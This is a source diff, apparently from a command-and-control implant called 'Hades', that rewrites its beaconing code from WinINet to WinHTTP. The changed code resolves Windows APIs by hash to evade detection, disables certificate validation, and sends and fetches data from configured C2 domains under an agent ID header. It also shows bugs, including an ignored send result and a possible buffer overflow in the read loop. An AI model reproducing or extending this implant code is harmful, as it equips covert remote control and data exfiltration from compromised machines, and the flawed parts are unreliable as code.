@@ -14,10 +14,10 @@ Network::Network(ULONG id) {
 	buf[0]  = 'w';
 	buf[1]  = 'i';
 	buf[2]  = 'n';
-	buf[3]  = 'i';
-	buf[4]  = 'n';
-	buf[5]  = 'e';
-	buf[6]  = 't';
+	buf[3]  = 'h';
+	buf[4]  = 't';
+	buf[5]  = 't';
+	buf[6]  = 'p';
 	buf[7]  = '.';
 	buf[8]  = 'd';
 	buf[9]  = 'l';
@@ -28,57 +28,75 @@ Network::Network(ULONG id) {
 	if (!hades->Modules.WININET) {
 		DEBUG_LOG("Failed loading Wininet: %d", GetLastError());
 	}
+
+	
+	
+
+	
+	DECL(WinHttpGetDefaultProxyConfiguration);
 	if (hades->Modules.WININET) {
-		this->HttpApis->InternetOpenA          = (decltype(this->HttpApis->InternetOpenA))GetProc(hades->Modules.WININET, HASHED_InternerOpenA);
-		this->HttpApis->HttpAddRequestHeadersA = (decltype(this->HttpApis->HttpAddRequestHeadersA))GetProc(hades->Modules.WININET, HASHED_AddHeaders);
-		this->HttpApis->HttpOpenRequestA	   = (decltype(this->HttpApis->HttpOpenRequestA))GetProc(hades->Modules.WININET, HASHED_OpenRequest);
-		this->HttpApis->HttpSendRequestA	   = (decltype(this->HttpApis->HttpSendRequestA))GetProc(hades->Modules.WININET, HASHED_SendRequest);
-		this->HttpApis->InternetCloseHandle	   = (decltype(this->HttpApis->InternetCloseHandle))GetProc(hades->Modules.WININET, HASHED_InternetCloseHandle);
-		this->HttpApis->InternetConnectA	   = (decltype(this->HttpApis->InternetConnectA))GetProc(hades->Modules.WININET, HASHED_InternetConnect);
-		this->HttpApis->InternetReadFile	   = (decltype(this->HttpApis->InternetReadFile))GetProc(hades->Modules.WININET, HASHED_InternetReadFile);
-		this->HttpApis->InternetSetOptionA	   = (decltype(this->HttpApis->InternetSetOptionA))GetProc(hades->Modules.WININET, HASHED_InternetSetOptionA);
-		this->HttpApis->HttpQueryInfoA         = (decltype(this->HttpApis->HttpQueryInfoA))GetProc(hades->Modules.WININET, HASHED_HttpQueryInfoA);
+		this->HttpApis->WinHttpOpen							  = (decltype(this->HttpApis->WinHttpOpen))GetProc(hades->Modules.WININET, HASHED_WinHttpOpen);
+		this->HttpApis->WinHttpConnect						  = (decltype(this->HttpApis->WinHttpConnect))GetProc(hades->Modules.WININET, HASHED_WinHttpConnect);
+		this->HttpApis->WinHttpCloseHandle					  = (decltype(this->HttpApis->WinHttpCloseHandle))GetProc(hades->Modules.WININET, HASHED_WinHttpCloseHandle);
+		this->HttpApis->WinHttpOpenRequest					  = (decltype(this->HttpApis->WinHttpOpenRequest))GetProc(hades->Modules.WININET, HASHED_WinHttpOpenRequest);
+		this->HttpApis->WinHttpSendRequest					  = (decltype(this->HttpApis->WinHttpSendRequest))GetProc(hades->Modules.WININET, HASHED_WinHttpSendRequest);
+		this->HttpApis->WinHttpReceiveResponse				  = (decltype(this->HttpApis->WinHttpReceiveResponse))GetProc(hades->Modules.WININET, HASHED_WinHttpReceiveResponse);
+		this->HttpApis->WinHttpQueryHeaders					  = (decltype(this->HttpApis->WinHttpQueryHeaders))GetProc(hades->Modules.WININET, HASHED_WinHttpQueryHeaders);
+		this->HttpApis->WinHttpQueryDataAvailable			  = (decltype(this->HttpApis->WinHttpQueryDataAvailable))GetProc(hades->Modules.WININET, HASHED_WinHttpQueryDataAvailable);
+		this->HttpApis->WinHttpReadData						  = (decltype(this->HttpApis->WinHttpReadData))GetProc(hades->Modules.WININET, HASHED_WinHttpReadData);
+		this->HttpApis->WinHttpSetOption					  = (decltype(this->HttpApis->WinHttpSetOption))GetProc(hades->Modules.WININET, HASHED_WinHttpSetOption);
+		this->HttpApis->WinHttpAddRequestHeaders			  = (decltype(this->HttpApis->WinHttpAddRequestHeaders))GetProc(hades->Modules.WININET, HASHED_WinHttpAddRequestHeaders);
+		this->HttpApis->WinHttpGetIEProxyConfigForCurrentUser = (decltype(this->HttpApis->WinHttpGetIEProxyConfigForCurrentUser))GetProc(hades->Modules.WININET, HASHED_WinHttpGetIEProxyConfigForCurrentUser);
+		this->HttpApis->WinHttpGetProxyForUrl                 = (decltype(this->HttpApis->WinHttpGetProxyForUrl))GetProc(hades->Modules.WININET, HASHED_WinHttpGetProxyForUrl);
+		this->HttpApis->WinHttpDetectAutoProxyConfigUrl       = (decltype(this->HttpApis->WinHttpDetectAutoProxyConfigUrl))GetProc(hades->Modules.WININET, HASHED_WinHttpDetectAutoProxyConfigUrl);
+		this->HttpApis->WinHttpGetDefaultProxyConfiguration   = (decltype(this->HttpApis->WinHttpGetDefaultProxyConfiguration))GetProc(hades->Modules.WININET, HASHED_WinHttpGetDefaultProxyConfiguration);
 	}
 
 	this->reqFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | 
-					 SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_RELOAD;
-
+					 SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+	this->Heap = GetPEB()->ProcessHeap;
 }
 
 
 
 
 BOOL Network::DoPostSingle(PBYTE toSend, SIZE_T len, DomainEntry* domain) {
-	HINTERNET hInternrt = NULL, hConnect = NULL, hRequest = NULL;
+	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+	BOOL bResults = FALSE;
 	DWORD flags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
 	BOOL ok = FALSE;
+	
+	DEBUG_LOG_WIDE(L"Sending Request to %s%s\n", domain->domain, conf->PostEndpoint);
 
-	DEBUG_LOG("Sending Request to %s%s\n", domain->domain, conf->PostEndpoint);
-	char buf[64];
-	snprintf(buf, 64, "X-Agent-ID: %u\r\n", this->HadesID);
-	hInternrt = this->HttpApis->InternetOpenA(conf->UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-	if (!hInternrt) goto CLEANUP;
+	hSession = this->HttpApis->WinHttpOpen(conf->UA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+		WINHTTP_NO_PROXY_NAME,
+		WINHTTP_NO_PROXY_BYPASS, 0);
+	if (!hSession) goto CLEANUP;
 
-	hConnect = this->HttpApis->InternetConnectA(hInternrt, domain->domain, domain->port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+	hConnect = this->HttpApis->WinHttpConnect(hSession, domain->domain, domain->port, 0);
 	if (!hConnect) goto CLEANUP;
 
-
-	if (domain->isHttps) {
-		flags |= INTERNET_FLAG_SECURE;
+	hRequest = this->HttpApis->WinHttpOpenRequest(hConnect, L"POST", conf->PostEndpoint, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+	if (!hRequest) goto CLEANUP;
+	WCHAR Header[64];
+	swprintf_s(Header, L"X-Agent-ID: %u\r\n", this->HadesID);
+	if (!this->HttpApis->WinHttpAddRequestHeaders(hRequest, Header, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE)) {
+		printf("Failed Set header: %d\n", GetLastError());
+		goto CLEANUP;
 	}
 
-	hRequest = this->HttpApis->HttpOpenRequestA(hConnect, "POST", conf->PostEndpoint, NULL, NULL, NULL, flags, 0);
-	if (!hRequest) goto CLEANUP;
-	this->HttpApis->HttpAddRequestHeadersA(hRequest, buf, (DWORD)-1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
-	this->HttpApis->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &this->reqFlags, sizeof(this->reqFlags));
+	if (!this->HttpApis->WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &this->reqFlags, sizeof(this->reqFlags))) {
+		goto CLEANUP;
+	}
+	this->HttpApis->WinHttpSendRequest(hRequest, NULL, 0, (LPVOID)toSend, len, len, 0);
 
-	if (!this->HttpApis->HttpSendRequestA(hRequest, NULL, 0, (LPVOID)toSend, len)) goto CLEANUP;
+	
 	ok = TRUE;
 
 CLEANUP:
-	if (hRequest) { this->HttpApis->InternetCloseHandle(hRequest); hRequest = NULL; }
-	if (hConnect) { this->HttpApis->InternetCloseHandle(hConnect); hConnect = NULL; }
-	if (hInternrt) { this->HttpApis->InternetCloseHandle(hInternrt); hInternrt = NULL; }
+	if (hRequest) { this->HttpApis->WinHttpCloseHandle(hRequest); hRequest = NULL; }
+	if (hConnect) { this->HttpApis->WinHttpCloseHandle(hConnect); hConnect = NULL; }
+	if (hSession) { this->HttpApis->WinHttpCloseHandle(hSession); hSession = NULL; }
 
 	if (!ok) {
 		return FALSE;
@@ -87,80 +105,101 @@ CLEANUP:
 	return TRUE;
 }
 
-
-
 BOOL Network::DoGetSingle(PBYTE* ResponseBuf, SIZE_T size, DomainEntry* domain, ULONG id, UINT *FinalSize, UINT *capacity) {
-	HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
-
-	UINT chunk = 4096;
-	UINT NewCapacity = size;
-	UINT Length = 0;
-
-	DWORD StatusCode = 0;
-	DWORD ScSize = sizeof(StatusCode);
-	DWORD flags = INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD;
-
-
+	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
 	BOOL ok = FALSE;
-	BOOL Res = FALSE;
-
-	char buf[64];
-	snprintf(buf, 64, "X-Agent-ID: %u\r\n", id);
-
-	hInternet = this->HttpApis->InternetOpenA(conf->UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-	if (!hInternet) goto CLEANUP;
-
-	hConnect = this->HttpApis->InternetConnectA(hInternet, domain->domain, domain->port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-	if (!hConnect) goto CLEANUP;
-
-	if (domain->isHttps) {
-		flags |= INTERNET_FLAG_SECURE;
+	DWORD Length = 0;
+	DWORD NewCapacity = *capacity;
+	const DWORD chunk = 4096;
+	DWORD StatusCode = 0;
+	DWORD dwSize = sizeof(StatusCode);
+	DWORD BytesRead = 0;
+	DWORD avail = 0;
+	hSession = this->HttpApis->WinHttpOpen(conf->UA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+	if (!hSession) {
+		DEBUG_LOG("Failed hSession: %d\n", GetLastError());
+		goto CLEANUP;
+	}
+	hConnect = this->HttpApis->WinHttpConnect(hSession, domain->domain, domain->port, 0);
+	if (!hConnect) {
+		DEBUG_LOG("Failed hConnect: %d\n", GetLastError());
+		goto CLEANUP;
 	}
 
-	hRequest = this->HttpApis->HttpOpenRequestA(hConnect, "GET", conf->GetEndpoint, NULL, NULL, NULL, flags, 0);
-	if (!hRequest) goto CLEANUP;
-	this->HttpApis->HttpAddRequestHeadersA(hRequest, buf, (DWORD)-1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
-	this->HttpApis->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &this->reqFlags, sizeof(this->reqFlags));
+	hRequest = this->HttpApis->WinHttpOpenRequest(hConnect, L"GET", conf->GetEndpoint, NULL, WINHTTP_NO_REFERER, 
+												  WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+	if (!hRequest) {
+		DEBUG_LOG("Failed hRequest: %d\n", GetLastError());
+		goto CLEANUP;
+	}
 
-	if (!this->HttpApis->HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) goto CLEANUP;
+	WCHAR Header[64];
+	swprintf_s(Header, L"X-Agent-ID: %u\r\n", this->HadesID);
+	if(!this->HttpApis->WinHttpAddRequestHeaders(hRequest, Header, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE)) {
+		DEBUG_LOG("Failed Set header: %d\n", GetLastError());
+		goto CLEANUP;
+	}
 
-	Res = this->HttpApis->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &StatusCode, &ScSize, NULL);
 
-	if (!Res) goto CLEANUP;
+	if (!this->HttpApis->WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &this->reqFlags, sizeof(this->reqFlags))) {
+		DEBUG_LOG("Failed SetOption: %d\n", GetLastError());
+		goto CLEANUP;
+	}
+
+	if (!this->HttpApis->WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
+		DEBUG_LOG("Failed Send Request: %d\n", GetLastError());
+		goto CLEANUP;
+	}
+
+	if (!this->HttpApis->WinHttpReceiveResponse(hRequest, NULL)) {
+		DEBUG_LOG("Failed Send Recieve: %d\n", GetLastError());
+		goto CLEANUP;
+	}
+
 	
-
+	if (!this->HttpApis->WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+		WINHTTP_HEADER_NAME_BY_INDEX,
+		&StatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX)) {
+		DEBUG_LOG("Failed Send QueryHeaders: %d\n", GetLastError());
+		goto CLEANUP;
+	}
 	if (StatusCode == 204) {
 		ok = TRUE;
 		*FinalSize = 0;
 		goto CLEANUP;
 	}
 
+	if (!this->HttpApis->WinHttpQueryDataAvailable(hRequest, &avail)) goto CLEANUP;
+
 	if (StatusCode == 200) {
 		while (TRUE) {
-			if (Length + chunk > NewCapacity) {
-				NewCapacity *= 2;
-				PBYTE tmp = (PBYTE)HeapReAlloc(GetProcessHeap(), 0, *ResponseBuf, NewCapacity);
+			if (Length + avail > NewCapacity) {
+				while(Length + avail > NewCapacity) NewCapacity *= 2;
+				PBYTE tmp = (PBYTE)HeapReAlloc(this->Heap, 0, *ResponseBuf, NewCapacity);
+				if (!tmp) goto CLEANUP;
 				*ResponseBuf = tmp;
 			}
-			DWORD BytesRead = 0;
-			if (!this->HttpApis->InternetReadFile(hRequest, *ResponseBuf + Length, chunk, &BytesRead)) goto CLEANUP;
+			
+			if (!this->HttpApis->WinHttpReadData(hRequest, *ResponseBuf + Length, chunk, &BytesRead)) goto CLEANUP;
 			if (BytesRead == 0) break;
 			Length += BytesRead;
 		}
 	}
-	else { return FALSE; }
-	
+	else {
+		DEBUG_LOG("Status code does not match %d\n", GetLastError());
+
+		goto CLEANUP;
+	}
+
 	*FinalSize = Length;
 	*capacity = NewCapacity;
 	ok = TRUE;
 
-
-	
 	
 CLEANUP:
-	if (hRequest) { this->HttpApis->InternetCloseHandle(hRequest); hRequest = NULL; }
-	if (hConnect) { this->HttpApis->InternetCloseHandle(hConnect); hConnect = NULL; }
-	if (hInternet) { this->HttpApis->InternetCloseHandle(hInternet); hInternet = NULL; }
+	if (hRequest) { this->HttpApis->WinHttpCloseHandle(hRequest); hRequest = NULL; }
+	if (hConnect) { this->HttpApis->WinHttpCloseHandle(hConnect); hConnect = NULL; }
+	if (hSession) { this->HttpApis->WinHttpCloseHandle(hSession); hSession = NULL; }
 
 	if (!ok) {
 		return FALSE;
